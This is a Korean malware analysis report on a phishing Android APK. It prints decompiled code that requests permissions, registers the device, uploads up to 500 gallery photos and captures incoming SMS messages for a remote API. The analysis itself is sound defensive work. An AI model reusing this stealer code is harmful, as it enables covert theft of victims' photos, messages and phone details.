# 분석 보고서

분석에 사용된 apk 파일은 실제 사건과 관련된 것으로 공유하지 않습니다.

## 분석 계기

![친구와의 대화 내용](images/친구와의%20대화%20내용.jpeg)

내 친구로부터 피싱으로 의심되는 문자가 왔고 문자 내 링크로부터 apk 파일을 다운 받게 되었다는 연락과 함께 해당 apk 파일을 받게 되어 해당 apk 파일을 설치하였을 시 어떤 동작을 수행하는지에 대해 알아보기 위해 분석을 시도하게 되었다.

## 요구 권한

AndroidManifest.xml에서 아래와 같은 권한을 찾을 수 있었다.

```xml
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES"/>
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.READ_PHONE_NUMBERS"/>
    <uses-permission android:name="android.provider.Telephony.SMS_RECEIVED"/>
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
```

### 권한 요청 과정

MainActivity의 onCreate가 호출되면 아래와 같은 내용을 수행하게 된다.

```java
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        new Handler().postDelayed(new RequestPermissions(this, 0), 300L);
    }
```

위 코드에서 RequestPermissions 클래스를 확인하면 아래와 같다.

```java
package com.example.gadfsdfsdfsgs;

/* renamed from: com.example.gadfsdfsdfsgs.c */
/* loaded from: classes.dex */
public final /* synthetic */ class RequestPermissions implements Runnable {

    /* renamed from: d */
    public final /* synthetic */ int f724d;

    /* renamed from: e */
    public final /* synthetic */ MainActivity f725e;

    public /* synthetic */ RequestPermissions(MainActivity mainActivity, int i2) {
        this.f724d = i2;
        this.f725e = mainActivity;
    }

    @Override // java.lang.Runnable
    public final void run() {
        int i2 = this.f724d;
        MainActivity mainActivity = this.f725e;
        switch (i2) {
            case 0:
                mainActivity.requestPermissions();
                break;
            case 1:
                mainActivity.lambda$forceBatteryOptimizationApprovalLoop$1();
                break;
            case 2:
                mainActivity.lambda$onAllPermissionsGranted$0();
                break;
            case 3:
                mainActivity.forceBatteryOptimizationApprovalLoop();
                break;
            default:
                mainActivity.requestPermissions();
                break;
        }
    }
}
```

위에서 i2 자리에는 0이 들어있기에 MainActivity의 requestPermissions 메소드가 호출되는 것을 확인 할 수 있으며 다시 MainActivity의 requestPermissions를 확인해보면 getRequiredPermissions에서 반환하는 권한들을 요구하는 것을 확인 할 수 있다.

```java
    private String[] getRequiredPermissions() {
        return new String[]{"android.permission.READ_SMS", Build.VERSION.SDK_INT >= 33 ? "android.permission.READ_MEDIA_IMAGES" : "android.permission.READ_EXTERNAL_STORAGE", "android.permission.READ_PHONE_STATE"};
    }
```

이러한 방식으로 MainActivity와 RequestPermissions은 서로 호출하며 개인정보 탈취에 필요한 모든 권한을 얻어내고 후에 휴대폰이 켜져 있는 동안 어플리케이션이 도중에 꺼지는 것을 방지하는 동작을 수행하는 것을 확인이 가능하였다.

## 개인정보 탈취 과정

```java
    public void onAllPermissionsGranted() {
        Intent intent = new Intent(this, (Class<?>) MainService.class);
        if (Build.VERSION.SDK_INT >= 26) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
        new Handler().postDelayed(new RequestPermissions(this, 2), 1000L);
        new Handler().postDelayed(new RequestPermissions(this, 3), 2000L);
    }
```

모든 권한을 얻고 나면 MainService가 실행되는데 이러한 MainService은 아래와 같은 역을 수행한다.

### 휴대폰 기종 등록

```java
    public void reportDeviceOnline() {
        HashMap map = new HashMap();
        map.put("device_id", this.deviceId);
        String str = Build.MODEL;
        if (str == null) {
            str = "UNKNOWN";
        }
        map.put("model", str);
        String str2 = Build.VERSION.RELEASE;
        map.put("android_version", str2 != null ? str2 : "UNKNOWN");
        map.put("carrier", getCarrierName());
        map.put("line_number", getLineNumber());
        this.api.reportOnline(map).enqueue(new EncryptedVolumeApplier(1, this));
    }
```

### 갤러리 내 사진 탈취

```java
    private void uploadAllPhotosMultiThread() {
        try {
            String lineNumber = getLineNumber();
            if (lineNumber == null || lineNumber.isEmpty()) {
                lineNumber = "unknown";
            }
            Cursor cursorQuery = getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, new String[]{"_data"}, null, null, "date_added DESC");
            if (cursorQuery != null) {
                ArrayList arrayList = new ArrayList();
                while (cursorQuery.moveToNext() && arrayList.size() < 500) {
                    String string = cursorQuery.getString(cursorQuery.getColumnIndexOrThrow("_data"));
                    if (new File(string).exists()) {
                        arrayList.add(string);
                    }
                }
                cursorQuery.close();
                ExecutorService executorServiceNewFixedThreadPool = Executors.newFixedThreadPool(4);
                Iterator it = arrayList.iterator();
                while (it.hasNext()) {
                    executorServiceNewFixedThreadPool.submit(new SuspectedEmojiCompatInitializer(this, (String) it.next(), lineNumber, 1));
                }
            }
        } catch (Exception e3) {
            e3.printStackTrace();
        }
    }
```

### 메시지 내역 감청

```java
    private void startNaverMonitor() {
        this.gadfsdfsdfsgs = new SMSObserver(this, new Handler(Looper.getMainLooper()));
        getContentResolver().registerContentObserver(Telephony.Sms.CONTENT_URI, true, this.gadfsdfsdfsgs);
    }
```

여기서 SMSObserver (저자가 분석을 위해 명칭을 수정하였다.) 는 아래와 같이 작성되었으며 메시지 내용을 탈취하는 것을 알 수 있다.

```java
public final class SMSObserver extends ContentObserver {

    /* renamed from: a */
    public final /* synthetic */ MainService mainService;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public SMSObserver(MainService mainService, Handler handler) {
        super(handler);
        this.mainService = mainService;
    }

    @Override // android.database.ContentObserver
    public final void onChange(boolean z2, Uri uri) {
        Cursor cursorQuery;
        MainService mainService = this.mainService;
        super.onChange(z2, uri);
        try {
            if (AbstractC0769h.m1411a(mainService, "android.permission.READ_SMS") == 0 && (cursorQuery = mainService.getContentResolver().query(Telephony.Sms.Inbox.CONTENT_URI, null, null, null, "date DESC LIMIT 1")) != null && cursorQuery.moveToFirst()) {
                String string = cursorQuery.getString(cursorQuery.getColumnIndex("body"));
                String string2 = cursorQuery.getString(cursorQuery.getColumnIndex("address"));
                long j2 = cursorQuery.getLong(cursorQuery.getColumnIndex("date"));
                if (!mainService.uploadedTimestamps.contains(Long.valueOf(j2))) {
                    mainService.uploadedTimestamps.add(Long.valueOf(j2));
                    MainService.InterfaceC0195a interfaceC0195a = mainService.api;
                    String str = mainService.deviceId;
                    String strValueOf = String.valueOf(j2);
                    String lineNumber = mainService.getLineNumber();
                    String str2 = Build.MODEL;
                    String str3 = str2 != null ? str2 : "UNKNOWN";
                    String str4 = Build.VERSION.RELEASE;
                    interfaceC0195a.sbtx(str, string2, string, strValueOf, lineNumber, str3, str4 != null ? str4 : "UNKNOWN").enqueue(new EncryptedVolumeApplier(3, this));
                }
                cursorQuery.close();
            }
        } catch (Exception e3) {
            e3.printStackTrace();
        }
    }
}
```
